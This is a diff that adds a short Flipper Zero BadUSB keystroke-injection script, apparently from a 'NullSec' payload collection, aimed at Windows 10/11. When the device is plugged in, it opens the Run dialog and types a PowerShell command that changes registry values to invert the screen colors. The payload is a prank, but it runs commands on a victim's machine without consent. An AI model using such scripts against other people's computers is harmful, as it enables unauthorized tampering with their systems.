@@ -1,0 +1,10 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Invert Screen Colors
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -c "Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' -Name Active -Value 1 -Type DWord -Force; Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' -Name FilterType -Value 1 -Type DWord -Force"
+ENTER
